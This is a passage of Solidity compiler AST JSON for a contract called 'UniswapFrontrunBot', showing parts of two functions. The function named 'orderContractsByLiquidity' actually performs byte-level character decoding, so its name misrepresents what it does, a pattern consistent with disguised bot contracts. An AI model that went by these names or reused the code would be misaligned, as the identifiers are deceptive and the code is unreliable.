																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 515,
																	"src": "6794:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6788:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 526,
															"nodeType": "ExpressionStatement",
															"src": "6788:7:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 529,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 527,
																	"name": "length",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 505,
																	"src": "6810:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 528,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6819:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "6810:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 530,
															"nodeType": "ExpressionStatement",
															"src": "6810:10:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 577,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 574,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 505,
														"src": "7134:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 575,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 488,
															"src": "7143:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 576,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "7143:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7134:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 581,
												"nodeType": "IfStatement",
												"src": "7130:59:0",
												"trueBody": {
													"id": 580,
													"nodeType": "Block",
													"src": "7154:35:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 578,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7176:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 492,
															"id": 579,
															"nodeType": "Return",
															"src": "7169:8:0"
														}
													]
												}
											},
											{
												"body": {
													"id": 628,
													"nodeType": "Block",
													"src": "7236:258:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 596,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 592,
																	"name": "divisor",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 508,
																	"src": "7251:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 595,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 593,
																		"name": "divisor",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 508,
																		"src": "7261:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "323536",
																		"id": 594,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7271:3:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_256_by_1",
																			"typeString": "int_const 256"
																		},
																		"value": "256"
																	},
																	"src": "7261:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7251:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 597,
															"nodeType": "ExpressionStatement",
															"src": "7251:23:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 605,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 598,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 515,
																	"src": "7289:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 604,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 601,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 599,
																					"name": "word",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 502,
																					"src": "7294:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "/",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 600,
																					"name": "divisor",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 508,
																					"src": "7301:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "7294:14:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 602,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7293:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784646",
																		"id": 603,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7312:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_255_by_1",
																			"typeString": "int_const 255"
																		},
																		"value": "0xFF"
																	},
																	"src": "7293:23:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7289:27:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 606,
															"nodeType": "ExpressionStatement",
															"src": "7289:27:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 611,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 609,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 607,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 515,
																		"src": "7335:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784330",
																		"id": 608,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7339:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_192_by_1",
																			"typeString": "int_const 192"
																		},
																		"value": "0xC0"
																	},
																	"src": "7335:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 610,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7347:4:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7335:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 615,
															"nodeType": "IfStatement",
															"src": "7331:108:0",
															"trueBody": {
																"id": 614,
																"nodeType": "Block",
																"src": "7353:86:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 612,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7422:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		},
																		"functionReturnParameters": 492,
																		"id": 613,
																		"nodeType": "Return",
																		"src": "7415:8:0"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 626,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 616,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 491,
																	"src": "7453:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 625,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 619,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 617,
																					"name": "ret",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 491,
																					"src": "7460:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3634",
																					"id": 618,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7466:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_64_by_1",
																						"typeString": "int_const 64"
																					},
																					"value": "64"
																				},
																				"src": "7460:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 620,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7459:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "|",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 623,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 621,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 515,
																					"src": "7473:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "&",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30783346",
																					"id": 622,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7477:4:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_63_by_1",
																						"typeString": "int_const 63"
																					},
																					"value": "0x3F"
																				},
																				"src": "7473:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 624,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7472:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "7459:23:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7453:29:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 627,
															"nodeType": "ExpressionStatement",
															"src": "7453:29:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 588,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 586,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 583,
														"src": "7219:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 587,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 505,
														"src": "7223:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7219:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 629,
												"initializationExpression": {
													"assignments": [
														583
													],
													"declarations": [
														{
															"constant": false,
															"id": 583,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 629,
															"src": "7207:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 582,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "7207:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 585,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 584,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7216:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "7207:10:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 590,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "7231:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 589,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 583,
															"src": "7231:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 591,
													"nodeType": "ExpressionStatement",
													"src": "7231:3:0"
												},
												"nodeType": "ForStatement",
												"src": "7202:292:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 630,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 491,
													"src": "7514:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 492,
												"id": 631,
												"nodeType": "Return",
												"src": "7507:10:0"
											}
										]
									},
									"documentation": null,
									"id": 633,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "orderContractsByLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 489,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 488,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 633,
												"src": "6413:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 487,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "6413:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6412:19:0"
									},
									"returnParameters": {
										"id": 492,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 491,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 633,
												"src": "6455:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 490,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6455:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6454:10:0"
									},
									"scope": 1680,
									"src": "6378:1147:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 720,
										"nodeType": "Block",
										"src": "7785:574:0",
										"statements": [
											{
												"assignments": [
													641
												],
												"declarations": [
													{
														"constant": false,
														"id": 641,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 720,
														"src": "7796:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 640,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7796:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 646,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 645,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 642,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 635,
															"src": "7807:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 643,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 38,
														"src": "7807:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3331",
														"id": 644,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7819:2:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_31_by_1",
															"typeString": "int_const 31"
														},
														"value": "31"
													},
													"src": "7807:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7796:25:0"
											},
											{
												"assignments": [
													648
												],
												"declarations": [
													{
														"constant": false,
														"id": 648,
														"mutability": "mutable",
														"name": "end",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 720,
														"src": "7832:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 647,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7832:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 653,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 652,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 649,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 641,
														"src": "7843:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 650,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 635,
															"src": "7849:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 651,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "7849:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7843:15:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7832:26:0"
											},
											{
												"body": {
													"id": 718,
													"nodeType": "Block",
													"src": "7897:455:0",
													"statements": [
														{
															"assignments": [
																665
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 665,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 718,
																	"src": "7912:7:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"typeName": {
																		"id": 664,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "7912:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 666,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "7912:7:0"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "7943:30:0",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "7945:26:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "ptr",
																							"nodeType": "YulIdentifier",
																							"src": "7960:3:0"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "7954:5:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "7954:10:0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "7966:4:0",
																					"type": "",
																					"value": "0xFF"
																				}
																			],
																			"functionName": {
																				"name": "and",
																				"nodeType": "YulIdentifier",
																				"src": "7950:3:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "7950:21:0"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "7945:1:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 665,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7945:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 641,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7960:3:0",
																	"valueSize": 1
																}
															],
															"id": 667,
															"nodeType": "InlineAssembly",
															"src": "7934:39:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																},
																"id": 670,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 668,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 665,
																	"src": "7991:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 669,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7995:4:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7991:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"id": 678,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 676,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 665,
																		"src": "8053:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "<",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784530",
																		"id": 677,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "8057:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_224_by_1",
																			"typeString": "int_const 224"
																		},
																		"value": "0xE0"
																	},
																	"src": "8053:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 686,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 684,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
